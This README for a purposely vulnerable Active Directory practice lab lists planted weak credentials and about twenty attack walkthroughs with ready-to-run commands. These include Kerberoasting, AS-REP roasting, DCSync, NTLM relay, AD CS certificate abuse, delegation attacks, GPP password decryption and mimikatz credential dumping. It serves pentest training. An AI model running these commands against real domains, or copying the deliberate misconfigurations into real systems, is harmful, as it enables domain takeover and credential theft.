# VulnAD — OnePiece Active Directory Lab

A purposely-vulnerable Active Directory lab for practicing AD pentesting. Two-VM setup: **Windows Server 2025 DC** + **Windows 10/11 workstation**.

> ⚠️ Run **only** in an isolated lab network. Never on a production domain or anything reachable from the internet.

---

## Lab Topology

```
   ┌──────────────────────┐         ┌──────────────────────┐
   │  DC01                │         │  WS01                │
   │  Windows Server 2025 │ <-----> │  Windows 10 / 11     │
   │  onepiece.local      │         │  domain-joined       │
   │  AD DS + AD CS       │         │  zoro.r = local admin│
   └──────────────────────┘         └──────────────────────┘
              ▲
              │ attacker (Kali) on same isolated subnet
              ▼
   ┌──────────────────────┐
   │  Kali                │
   └──────────────────────┘
```

---

## Setup

### 1. Domain Controller (Win Server 2025)

From an elevated PowerShell:
```powershell
.\vulnad.ps1
```

On the **first run**, the script prompts you to confirm a static IP. The current DHCP-assigned IP / prefix / gateway are pre-filled as defaults — **just press Enter to keep them** (the IP simply converts from DHCP to static, so you don't lose RDP). DNS is auto-set to `127.0.0.1`. Skipped automatically on later runs.

The full setup spans three runs (with automatic reboots in between):
- **Run 1**: static IP, renames host to `DC01` → reboots.
- **Run 2**: installs AD DS, promotes to DC for `onepiece.local` → reboots.
- **Run 3**: populates users / groups / OUs / vulns / AD CS / loot. Watch for the green `=== SETUP COMPLETE ===` banner.

You don't need to pre-install AD-Domain-Services — the script does it.

### 2. Workstation (Win 10 / Win 11)

1. Open `vulnad-workstation.ps1` and set `$Global:DCIPAddress` to the DC's IP.
2. From elevated PowerShell:

```powershell
.\vulnad-workstation.ps1            # joins domain, reboots
# after reboot, log in as onepiece\luffy.m / Password123!
.\vulnad-workstation.ps1 -Phase Post   # plants local vulns
```

### 3. Snapshot both VMs.

---

## Credentials

| User             | Password        | Notes                                 |
|------------------|-----------------|---------------------------------------|
| `luffy.m`        | `Password123!`  | Domain Admin                          |
| `roger.g`        | `Changeme123!`  | Domain Admin (weak/spray password)    |
| `rayleigh.s`     | `Winter2023!`   | Domain Admin (weak/spray password)    |
| `garp.m`         | `Changeme123!`  | reused password (spraying)            |
| `smoker.c`       | `Summer2024!`   | reused password (spraying)            |
| `enel.g`         | `Password333!`  | DnsAdmins, no preauth                 |
| `shirahoshi`     | `Password444!`  | DnsAdmins, no preauth                 |
| `bonclay.b`      | `Password777!`  | no preauth, **DCSync rights**         |
| `franky.c`       | `Password555!`  | unconstrained delegation              |
| `brook.b`        | `Password666!`  | unconstrained delegation              |
| `merry_svc`      | `Password123!`  | SPN — kerberoastable                  |
| `cifs_svc`       | `Password123!`  | SPN — kerberoastable                  |
| `http_svc`       | `Password123!`  | SPN — kerberoastable                  |
| `sql_svc`        | `Sup3rS3cr3t!`  | SPN MSSQL — kerberoastable            |
| `backup_svc`     | `Backup123!`    | referenced in loot files              |
| `helpdesk_svc`   | `Helpdesk2024!` | referenced in loot files              |
| `nami.n`         | `Password789!`  | constrained delegation to CIFS/DC01   |
| `usopp.u`        | `Password202!`  | RBCD source → FILES01$                |
| `kid.e`          | `Password222!`  | ReadLAPSPassword + ReadGMSAPassword   |
| (others)         | `Password###!`  | see `Import-OnePieceUsers` in script  |

---

## Attack Paths

### 1. Password Spraying
Reused weak passwords across multiple users.

```bash
kerbrute passwordspray -d onepiece.local users.txt 'Changeme123!'
# hits roger.g (Domain Admin), garp.m
```

### 2. AS-REP Roasting — `enel.g`, `shirahoshi`, `bonclay.b`
Pre-authentication disabled.

```bash
impacket-GetNPUsers onepiece.local/ -usersfile users.txt -no-pass -dc-ip <DC>
hashcat -m 18200 hashes.txt rockyou.txt
```

### 3. Kerberoasting — `merry_svc`, `cifs_svc`, `http_svc`
Service accounts with SPNs.

```bash
impacket-GetUserSPNs onepiece.local/luffy.m:'Password123!' -dc-ip <DC> -request
hashcat -m 13100 hashes.txt rockyou.txt
```

### 4. Unconstrained Delegation — `franky.c`, `brook.b`
Compromise either user → coerce DC auth via PetitPotam → capture DC TGT.

```bash
# from attacker, having compromised franky.c
impacket-PetitPotam -u franky.c -p 'Password555!' <attacker-ip> <DC-ip>
# combine with rubeus monitor for TGT capture
```

### 5. DCSync — `bonclay.b`
Granted `DS-Replication-Get-Changes(-All)` on the domain root directly (not via DA membership).

```bash
impacket-secretsdump onepiece.local/bonclay.b:'Password777!'@<DC> -just-dc
```

### 6. ACL Abuse (BloodHound paths)
| Edge                                              | How to exploit                                      |
|---------------------------------------------------|-----------------------------------------------------|
| `zoro.r` —GenericAll→ `nami.n`                    | Reset nami's password, take over                    |
| `sanji.v` —ForceChangePassword→ `usopp.u`         | Reset usopp's password                              |
| `law.t` —WriteDACL→ `Warlords of the Sea` (group) | Grant self GenericAll, add self                     |
| `kid.e` —GenericWrite→ `Supernovas` (group)       | Add self to group                                   |
| `doflamingo` —WriteOwner→ `shirahoshi`            | Take ownership, grant DACL, full takeover           |

Run BloodHound to enumerate:
```bash
bloodhound-python -u luffy.m -p 'Password123!' -d onepiece.local -ns <DC> -c All
```

### 7. SMB Relay — signing disabled domain-wide
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
# combine with PetitPotam / mitm6 for coerced auth
```

### 8. RBCD / Shadow Credentials
`ms-DS-MachineAccountQuota = 20` → any domain user can create computer accounts.

```bash
impacket-addcomputer onepiece.local/luffy.m:'Password123!' -computer-name 'EVIL$' -computer-pass 'Evil123!'
# then s4u abuse via impacket-getST / Rubeus
```

### 9. AD CS Attacks
| ID      | Primitive                                                                   |
|---------|-----------------------------------------------------------------------------|
| **ESC1**  | Template `ESC1-VulnUser`: ENROLLEE_SUPPLIES_SUBJECT + Client Auth, Domain Users enroll. Request with `-upn administrator@onepiece.local`. |
| **ESC6**  | `EDITF_ATTRIBUTESUBJECT` set on CA → SAN injection on any template.       |
| **ESC8**  | Web Enrollment at `http://DC01/certsrv` → NTLM-relay coerced DC auth to it. |
| **ESC9**  | Template `ESC9-NoSecExt` lacks `szOID_NTDS_CA_SECURITY_EXT` → UPN spoof.  |
| **ESC10** | DC has `StrongCertificateBindingEnforcement=0` + weak `CertificateMappingMethods` → ESC9 / cert UPN-spoof works. |
| **ESC11** | `enel.g` / `shirahoshi` in DnsAdmins → DLL hijack DNS to NT AUTHORITY\SYSTEM on DC. |
| **ESC15** | Template `ESC15-Editable` — editable subject primitive.                    |
| **ESC16** | `szOID_NTDS_CA_SECURITY_EXT` disabled CA-wide → all issued certs vulnerable to weak mapping. |

```bash
certipy find -u luffy.m@onepiece.local -p 'Password123!' -dc-ip <DC> -vulnerable -stdout

# ESC1
certipy req -u luffy.m@onepiece.local -p 'Password123!' -ca OnePiece-CA \
            -template ESC1-VulnUser -upn administrator@onepiece.local -dc-ip <DC>

# ESC8 (relay)
impacket-PetitPotam -u luffy.m -p 'Password123!' <attacker-ip> <DC-ip>
impacket-ntlmrelayx -t http://<DC>/certsrv/certfnsh.asp --adcs --template DomainController
```

### 10. Constrained Delegation — `nami.n`
`msDS-AllowedToDelegateTo = CIFS/DC01` with **TRUSTED_TO_AUTH_FOR_DELEGATION** (protocol transition). Compromise nami.n → S4U2Self+S4U2Proxy → impersonate any user against CIFS on DC.

```bash
impacket-getST -spn cifs/dc01.onepiece.local -impersonate administrator \
  onepiece.local/nami.n:'Password789!'
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass dc01.onepiece.local
```

### 11. RBCD — `usopp.u` → `FILES01$`
`FILES01$` has `msDS-AllowedToActOnBehalfOfOtherIdentity` allowing `usopp.u`.

```bash
impacket-getST -spn cifs/files01.onepiece.local -impersonate administrator \
  -dc-ip <DC> 'onepiece.local/usopp.u:Password202!'
```

### 12. LAPS Read — `kid.e`
Granted `ReadLAPSPassword` on `OU=Workstations`. WS01 publishes its LocalAdmin password to AD.

```bash
# from kid.e session
nxc ldap <DC> -u kid.e -p 'Password222!' -M laps
# or: Get-LapsADPassword -Identity WS01 -AsPlainText
```
Then RDP/WinRM into WS01 as `LocalAdmin`.

### 13. gMSA Password Read — `kid.e`
`gmsa_sql` has `PrincipalsAllowedToRetrieveManagedPassword = kid.e`.

```bash
nxc ldap <DC> -u kid.e -p 'Password222!' --gmsa
# returns NTLM hash for gmsa_sql$
```

### 14. LDAP Anonymous Bind + Pre-Win2000
Unauthenticated enumeration of users, computers, group memberships.

```bash
ldapsearch -x -H ldap://<DC> -b "DC=onepiece,DC=local" -s sub "(objectClass=user)" sAMAccountName
# also: Authenticated Users is in Pre-Win2K group -> more attributes readable
```

### 15. ADIDNS Wildcard
Wildcard `*.onepiece.local` resolves to DC. Attacker can override with their own ADIDNS record (any authenticated user can add DNS records via dynamic update).

```bash
# from compromised user
inveigh -DNS Y -DNSName <attacker-ip>
# or use krbrelayx adidns module
```

### 16. Certifried (CVE-2022-26923)
Template `Certifried-Machine` allows Domain Computers to enroll; subject built from AD + missing SID extension. Combined with `MachineAccountQuota>=1`:

```bash
certipy account create -u luffy.m@onepiece.local -p 'Password123!' \
  -user 'evil$' -dns 'dc01.onepiece.local' -dc-ip <DC>
certipy req -u 'evil$@onepiece.local' -p 'EvilPass' \
  -ca OnePiece-CA -template Certifried-Machine -dc-ip <DC>
certipy auth -pfx 'dc01.pfx' -dc-ip <DC>   # gets DC TGT
```

### 17. Print Spooler / PrinterBug
Spooler running on DC and WS01 → coerce auth via MS-RPRN.

```bash
impacket-printerbug 'onepiece.local/luffy.m:Password123!@<DC>' <attacker-ip>
```

### 18. GPP cpassword in SYSVOL
GPO `OnePiece-Workstation-Policy` ships a `Groups.xml` with a `cpassword` for a local "LocalAdmin" account.

```bash
# from any domain user
smbclient -U 'luffy.m%Password123!' //dc01/SYSVOL
# pull \onepiece.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
gpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'
# -> Local*P4ss!
```

### 19. File Share Loot — `\\DC01\Public`
Cleartext credentials in scripts.

```bash
smbclient -U 'luffy.m%Password123!' //dc01/Public
# pulls backup.bat (backup_svc:Backup123!),
# fix-ws01.ps1 (helpdesk_svc:Helpdesk2024!),
# db-conn.txt (sa:Sup3rS3cr3t!)
```

### 20. MSSQL on WS01
SA cleartext on disk via #19, or impersonate sa from any low-priv login.

```bash
impacket-mssqlclient onepiece.local/sa:'Sup3rS3cr3t!'@ws01 -windows-auth
# EXEC AS LOGIN = 'sa';
# EXEC xp_cmdshell 'whoami';
# linked-server pivot:
# SELECT * FROM OPENQUERY([DC01-LINK], 'SELECT @@VERSION');
```

### 21. Workstation-Side (WS01)
After running `vulnad-workstation.ps1 -Phase Post`:
- **`ONEPIECE\zoro.r` is local Administrator** on WS01 → password spray / phishing zoro → lateral move with PSRemoting.
- **WDigest cleartext** — mimikatz `sekurlsa::wdigest` recovers plaintext after any logon.
- **Unquoted service path** — `VulnSvc` at `C:\Program Files\Vuln Service\service.exe`, `C:\Program Files` writable by Authenticated Users → drop `Program.exe`.
- **Loot file** at `C:\Users\Public\Documents\backup-notes.txt` (creds for `backup_svc`).
- **Cached domain credentials** (mscash) — `CachedLogonsCount=10`, dump with mimikatz `lsadump::cache`.
- **Defender RTP disabled** — drop any tooling without smartscreen interference.

---

## Verification Checklist (run on DC)

```powershell
Get-ADUser -Filter * | Select SamAccountName
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true'
Get-ADUser -Filter 'TrustedForDelegation -eq $true'
Get-ADUser -Filter * -Properties ServicePrincipalName | Where { $_.ServicePrincipalName }
Get-SmbServerConfiguration | Select RequireSecuritySignature, EnableSecuritySignature
certutil -ping
certutil -CATemplates | findstr ESC
Invoke-RestMethod http://DC01/certsrv -UseDefaultCredentials   # should not 404
```

---

## Reset

Revert to your VM snapshots. The script is idempotent enough to re-run, but ACL grants, CA registry tweaks, and template publishes accumulate — snapshots are cleaner.
